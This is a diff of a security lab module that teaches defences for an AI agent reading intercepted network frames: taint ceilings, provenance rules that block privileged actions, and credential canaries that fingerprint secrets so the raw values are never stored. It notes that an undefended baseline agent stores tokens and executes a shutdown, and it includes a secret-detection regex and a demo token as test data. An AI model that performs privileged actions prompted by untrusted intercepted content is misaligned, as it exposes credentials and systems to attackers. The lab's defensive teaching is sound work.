+When a credential-like value is parsed (`credential_flags` non-empty — the `ContentDetector` rules `json_credential`, `kv_credential`, `bearer_token`): (1) never buffer the real value — buffer `sha256(value)[:12]` plus a canary `CANARY_CRED_<n>`; (2) emit a blocked entry `{"action": "store_token", "reason": "credential_canary_quarantined", "fingerprint": …}`. Demonstrate that the buffer never contains `DEMO_TOKEN_ABC123` but the audit log identifies which frame carried it. (`test_exercise_credential_canary` is the starting point.)
 
 **What this teaches**: Data minimization as defense: you can *alert* on secrets without *possessing* them. The fingerprint preserves forensics; the secret never enters the pipeline.
 
@@ -309,22 +406,22 @@ When a credential-like value (regex `token|secret|password|bearer`, case-insensi
 
 ## 📝 Lab Notes Questions
 
-1. Frame_004 (TLS, MEDIUM, clean) is parsed and buffered but triggers no sensitive action; frame_001 (HTTP, HIGH) is parsed, buffered, and *blocked* from token storage. Explain exactly where the pipeline treated them differently, and why observing both was acceptable.
-2. The guard has two blocking rules (taint ceiling; intercepted-requires-LOW). Construct a case where rule 2 blocks something rule 1 would allow, and explain what attack rule 2 exists for.
-3. Step 7's buffer held a "credential" for up to 60 seconds by design. List the residual risks of that design and one mitigation for each (hint: memory, swaps, forks, exception paths).
+1. Frame_004 (TLS, MEDIUM, clean) and frame_001 (HTTP, HIGH) are both parsed, buffered, and *allowed* `record_observation`; only frame_001 attempts `store_token`, and is *blocked*. Explain exactly where the pipeline treated them differently, and why observing both was acceptable.
+2. The guard has two blocking rules (per-action taint ceiling; privileged actions refuse `intercepted_network` provenance). Construct a case where rule 2 blocks something rule 1 would allow — the full run's `frame_001_relabelled_low` is one — and explain what attack rule 2 exists for.
+3. The fixture's buffer keeps an entry for up to 60 seconds, and the agent purges each frame's entries as soon as the frame is decided — but zeroing reaches only the buffer's own copy. List the residual risks of that design and one mitigation for each (hint: memory, swaps, forks, exception paths).
 
 ---
 
 ## ✅ Completion Checklist
 
-- [ ] Six frames read; prediction table completed *before* running
+- [ ] Eight frames read; prediction table completed *before* running
 - [ ] Taint propagation inspected (frame-wide, nested flattening)
 - [ ] Baseline's store_token + execute_shutdown observed
-- [ ] Defended agent's three distinct block reasons recorded
-- [ ] Guard boundary swept at max=LOW and max=MEDIUM; rule-2 case identified
-- [ ] Scope-vs-taint separation demonstrated with a synthetic frame
-- [ ] Buffer TTL + secure-delete exercised; residual-risk note written
-- [ ] All 15 tests pass; the scope-test-vs-fixture conflict story noted
+- [ ] Defended agent's three distinct block reasons recorded, plus what was allowed (observations from frames 001–006; frame_008's store_token)
+- [ ] Guard boundary swept at the fixture's ceilings and with the default raised to MEDIUM; rule-2 case identified
+- [ ] Scope-vs-taint separation demonstrated with synthetic frames (source and destination)
+- [ ] Buffer TTL, eviction, and zeroing exercised; residual-risk note written
+- [ ] All 39 tests pass; the parse-never-called scope test noted
 - [ ] At least Beginner + Exercise 9.2 (refinement) — 9.2 is essential
 - [ ] `LAB_NOTES.md` Module 9 block filled (seed 42, commit, `make demo DEMO=09`)
 
